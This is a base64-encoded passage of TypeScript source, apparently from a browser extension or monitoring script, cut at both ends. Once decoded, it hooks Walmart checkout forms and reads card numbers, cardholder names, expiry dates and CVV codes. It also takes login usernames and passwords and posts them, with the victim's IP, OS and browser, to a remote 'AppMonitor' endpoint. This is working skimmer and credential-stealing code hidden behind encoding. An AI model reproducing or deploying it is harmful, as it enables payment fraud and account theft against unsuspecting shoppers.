KCdwYXltZW50LW9wdGlvbicpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogZWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6ICdjYXJkQnJhbmQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZWxlbWVudC5jbGFzc05hbWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnQuY2xhc3NMaXN0LmFkZCgncGF5bWVudC1vcHRpb24nKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5lZGl0LWZvcm0ubXVsdGlwbGUtcmVxdWlyZWQnKSBhcyBIVE1MRWxlbWVudCksICdmaXJzdE5hbWUnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZWRpdC1mb3JtLm11bHRpcGxlLXJlcXVpcmVkJykgYXMgSFRNTEVsZW1lbnQpLCAnbGFzdE5hbWUnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudFNlbGVjdFRhZyhzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtZm9ybS5tdWx0aXBsZS1yZXF1aXJlZCcpIGFzIEhUTUxFbGVtZW50KSwgJ21vbnRoLWNob29zZXInLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudFNlbGVjdFRhZyhzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtZm9ybS5tdWx0aXBsZS1yZXF1aXJlZCcpIGFzIEhUTUxFbGVtZW50KSwgJ3llYXItY2hvb3NlcicsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5lZGl0LWZvcm0ubXVsdGlwbGUtcmVxdWlyZWQnKSBhcyBIVE1MRWxlbWVudCksICdjdnYnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMV0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMl0udmFsdWUgKyAnICcgKyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVszXS52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJjYXJkRXhwaXJlXCI6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzRdLnZhbHVlICsgJy8nICsgdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbNV0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbNl0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVXYWxtYXJ0UGF5bWVudEVkaXRCdXR0b24oc2VsZik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pXHJcbiAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0sIDEwMCk7XHJcbiAgICB9XHJcblxyXG4gICAgZXhwbG9yZVdhbG1hcnRQYXltZW50RWRpdEJ1dHRvbihzZWxmOiB0aGlzKSB7XHJcbiAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLmJ1dHRvbi5saW5rLkNYT19tb2R1bGVfaGVhZGVyX2VkaXRfYnV0dG9uLmJ1dHRvbi0tbGluaycpLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLmJ1dHRvbi5saW5rLkNYT19tb2R1bGVfaGVhZGVyX2VkaXRfYnV0dG9uLmJ1dHRvbi0tbGluaycpLmZvckVhY2goZnVuY3Rpb24gKGZvcm1FZGl0QnV0dG9uKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGZvcm1FZGl0QnV0dG9uLmdldEF0dHJpYnV0ZSgnZGF0YS1hdXRvbWF0aW9uLWlkJykgPT09ICdlZGl0LXBheW1lbnQnKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBmb3JtRWRpdEJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVdhbG1hcnRQYXltZW50Q29udGFpbmVyKHNlbGYpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9KVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSwgMTAwKTtcclxuICAgIH1cclxuXHJcbiAgICBleHBsb3JlUGF5bWVudE5ld0NhcmQoc2VsZjogdGhpcywgZWxlbWVudFBhcmVudE5vZGU6IEhUTUxFbGVtZW50LCBjYWxsYmFjaz86IGFueSkge1xyXG4gICAgICAgIGxldCBkZXRlY3RlZEVsZW1lbnRzOiBhbnlbXSA9IFtdO1xyXG4gICAgICAgIGlmIChlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICBlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ2NhcmQtc3VyZmFjZScpKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkubm9kZU5hbWUgPT09ICdESVYnICYmIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fdGFyZ2V0UGFyZW50RWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChfX3RhcmdldFBhcmVudEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNsYXNzTGlzdC5jb250YWlucygnY2FyZC1ubycpKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChfX3RhcmdldFBhcmVudEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLCAnY2FyZE5vJywgZnVuY3Rpb24gKGRldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRldGVjdGVkRWxlbWVudHMucHVzaChkZXRlY3RlZEVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChfX3RhcmdldFBhcmVudEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNsYXNzTGlzdC5jb250YWlucygnY2FyZC1ib3R0b20nKSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoX190YXJnZXRQYXJlbnRFbGVtZW50IGFzIEhUTUxFbGVtZW50KSwgJ2NhcmRIb2xkZXInLCBmdW5jdGlvbiAoZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGV0ZWN0ZWRFbGVtZW50cy5wdXNoKGRldGVjdGVkRWxlbWVudCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChfX3RhcmdldFBhcmVudEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLCAnZXhwaXJlJywgZnVuY3Rpb24gKGRldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRldGVjdGVkRWxlbWVudHMucHVzaChkZXRlY3RlZEVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoX190YXJnZXRQYXJlbnRFbGVtZW50IGFzIEhUTUxFbGVtZW50KSwgJ2N2YycsIGZ1bmN0aW9uIChkZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXRlY3RlZEVsZW1lbnRzLnB1c2goZGV0ZWN0ZWRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcclxuICAgICAgICAgICAgICAgIGNhbGxiYWNrKGRldGVjdGVkRWxlbWVudHMpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVQYXltZW50U3BhblRhZyhzZWxmOiB0aGlzLCBlbGVtZW50UGFyZW50Tm9kZTogSFRNTEVsZW1lbnQsIGNhbGxiYWNrPzogYW55KSB7XHJcbiAgICAgICAgaWYgKGVsZW1lbnRQYXJlbnROb2RlLmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgIGVsZW1lbnRQYXJlbnROb2RlLmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NQQU4nICYmIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCdwYXltZW50LXRpdGxlJykpIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soX19jaGlsZEVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudFNwYW5UYWcoc2VsZiwgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KSwgY2FsbGJhY2spXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBleHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGY6IHRoaXMsIGVsZW1lbnRQYXJlbnROb2RlOiBIVE1MRWxlbWVudCwgc2VsZklkOiBzdHJpbmcsIGNhbGxiYWNrOiBhbnkpIHtcclxuICAgICAgICBpZiAoZWxlbWVudFBhcmVudE5vZGUuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgZWxlbWVudFBhcmVudE5vZGUuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnICYmIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuaWQuaW5kZXhPZihzZWxmSWQpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjaygoX19jaGlsZEVsZW1lbnQgYXMgSFRNTElucHV0RWxlbWVudCkpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCksIHNlbGZJZCwgY2FsbGJhY2spXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBleHBsb3JlUGF5bWVudFNlbGVjdFRhZyhzZWxmOiB0aGlzLCBlbGVtZW50UGFyZW50Tm9kZTogSFRNTEVsZW1lbnQsIHNlbGZJZDogc3RyaW5nLCBjYWxsYmFjazogYW55KSB7XHJcbiAgICAgICAgaWYgKGVsZW1lbnRQYXJlbnROb2RlLmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgIGVsZW1lbnRQYXJlbnROb2RlLmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NFTEVDVCcgJiYgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5pZC5pbmRleE9mKHNlbGZJZCkgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKChfX2NoaWxkRWxlbWVudCBhcyBIVE1MSW5wdXRFbGVtZW50KSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50U2VsZWN0VGFnKHNlbGYsIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCksIHNlbGZJZCwgY2FsbGJhY2spXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgc2VuZChyZXF1ZXN0OiBhbnkpIHtcclxuICAgICAgICBpZiAodHlwZW9mIHJlcXVlc3QgPT09ICdvYmplY3QnICYmIHJlcXVlc3QuY29uc3RydWN0b3IgPT09IE9iamVjdCAmJiBPYmplY3Qua2V5cyhyZXF1ZXN0KS5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdpcCcpICE9PSBudWxsKXtcclxuICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcclxuICAgICAgICAgICAgICAgICAgICBpbXBvcnQoJy4uL2NvbW1vbi9yZXF1ZXN0JykudGhlbihmdW5jdGlvbiAodCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5jb21tYW5kID09PSAnc2F2ZUxvZ2luRGF0YScgfHwgcmVxdWVzdC5jb21tYW5kID09PSAnc2F2ZVJlZ2lzdHJhdGlvbkRhdGEnIHx8IHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVMb2dvdXREYXRhJyB8fCByZXF1ZXN0LmNvbW1hbmQgPT09ICdzYXZlTmF2aWdhdGVEYXRhJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVMb2dpbkRhdGEnKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHQuc2VuZFJlcXVlc3Qoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q6IFwiUE9TVFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGdsb2JhbEFwcE1vbml0b3JNYWluVVJMICsgXCJicm93c2VyVXNlckRhdGFNYW5hZ2VtZW50XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jOiB0cnVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXI6IFt7bmFtZTogXCJDb250ZW50LXR5cGVcIiwgdmFsdWU6IFwiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PVVURi04XCJ9XSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJjb21tYW5kXCI6IHJlcXVlc3QuY29tbWFuZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidXNlcmRhdGFcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9kZWZhdWx0Xzoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInRyYWNrZXJcIjogVHJhY2tlci5pZGVudGl0eSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJhcHBfaWRcIjogVHJhY2tlci52ZXJzaW9uLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImlwXCI6IHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdpcCcpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIm9zX25hbWVfYXJjaFwiOiBUcmFja2VyLm9zTmFtZUFuZEFyY2gsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYnJvd3NlclwiOiBUcmFja2VyLmJyb3dzZXJOYW1lRnVsbFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJldmVudFwiOiAnbG9naW4nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwidXNlcm5hbWVcIjogcmVxdWVzdC5kYXRhLnVzZXJuYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwicGFzc3dvcmRcIjogcmVxdWVzdC5kYXRhLnBhc3N3b3JkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogcmVxdWVzdC5kYXRhLndvcmtXZWJzaXRlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHJlcXVlc3QuY29tbWFuZCA9PT0gJ3NhdmVSZWdpc3RyYXRpb25EYXRhJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0LnNlbmRSZXF1ZXN0KHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiBcIlBPU1RcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBnbG9iYWxBcHBNb25pdG9yTWFpblVSTCArIFwiYnJvd3NlclVzZXJEYXRhTWFuYWdlbWVudFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYzogdHJ1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVyOiBbe25hbWU6IFwiQ29udGVudC10eXBlXCIsIHZhbHVlOiBcImFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD1VVEYtOFwifV0sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY29tbWFuZFwiOiByZXF1ZXN0LmNvbW1hbmQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcInVzZXJkYXRhXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfZGVmYXVsdF86IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ0cmFja2VyXCI6IFRyYWNrZXIuaWRlbnRpdHksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiYXBwX2lkXCI6IFRyYWNrZXIudmVyc2lvbixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJpcFwiOiB3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnaXAnKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJvc19uYW1lX2FyY2hcIjogVHJhY2tlci5vc05hbWVBbmRBcmNoLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImJyb3dzZXJcIjogVHJhY2tlci5icm93c2VyTmFtZUZ1bGxcclxuICAgICAgI